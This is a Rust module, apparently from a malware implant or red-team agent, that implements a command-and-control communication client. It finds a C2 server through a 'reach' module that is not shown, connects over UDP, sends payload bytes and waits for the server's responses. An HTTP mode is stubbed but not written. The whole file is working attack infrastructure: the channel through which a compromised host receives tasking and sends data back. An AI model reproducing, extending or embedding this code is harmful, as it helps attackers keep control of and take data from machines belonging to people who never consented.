use std::time::Duration;
use thiserror::Error;
use tokio::{net::UdpSocket, time::timeout};

pub mod payloads;
mod reach;

#[derive(Error, Debug)]
pub enum C2ComError {
    #[error(transparent)]
    ReachFailure(#[from] reach::ReachError),

    #[error("C2Com connection failure. {0}")]
    ConnectionFailure(#[from] std::io::Error),

    #[error("C2Com timeout occurred. {0}")]
    Timeout(String),
}

pub struct C2Com {
    udp_sock: Option<UdpSocket>,
}

pub fn init() -> C2Com {
    C2Com { udp_sock: None }
}

impl C2Com {
    pub async fn send_bytes(&mut self, data: Vec<u8>) -> Result<(), C2ComError> {
        setup_communications(self).await?;

        if let Some(sock) = &self.udp_sock {
            println!("c2>> sending bytes via udp socket.");
            timeout(Duration::from_secs(10), sock.send(&data))
                .await
                .map_err(|_| {
                    C2ComError::Timeout("Timed out sending payload to c2 via udp.".into())
                })??;
        }

        Ok(())
    }

    pub async fn ask(&mut self, payload: Vec<u8>) -> Result<Option<Vec<u8>>, C2ComError> {
        self.send_bytes(payload).await?;

        if let Some(sock) = &self.udp_sock {
            println!("c2?? waiting for ask-response via udp socket.");
            let mut response_buf = [0u8; 65535];
            if let Some(result) = timeout(Duration::from_secs(10), sock.recv(&mut response_buf))
                .await
                .ok()
            {
                let len = result?;
                println!("c2<< got ask-response ({len}) via udp socket.");
                return Ok(Some(response_buf[..len].to_vec()));
            }
        }

        println!("c2-- no ask-response via udp socket.");
        Ok(None)
    }
}

async fn setup_communications(c2com: &mut C2Com) -> Result<(), C2ComError> {
    if c2com.udp_sock.is_some() {
        return Ok(());
    }

    println!("+--- setting up c2 coms ---+");

    let reach_info = reach::reach_c2().await?;
    match reach_info.com_mode {
        reach::ReachComMode::UDP => {
            println!(" - identified udp reach method.");
            let remote_addr =
                std::net::SocketAddr::new(std::net::IpAddr::V4(reach_info.ipv4), reach_info.port);

            let sock = UdpSocket::bind("0.0.0.0:0").await?;

            timeout(Duration::from_secs(10), sock.connect(remote_addr))
                .await
                .map_err(|_| C2ComError::Timeout("Timed out connecting to c2 udp.".into()))??;

            println!(" - setup udp socket connected to c2.");
            c2com.udp_sock = Some(sock);
        }
        reach::ReachComMode::HTTP => {
            eprintln!("HTTP C2Com mode not yet implemented.")
        }
    }

    println!();
    Ok(())
}
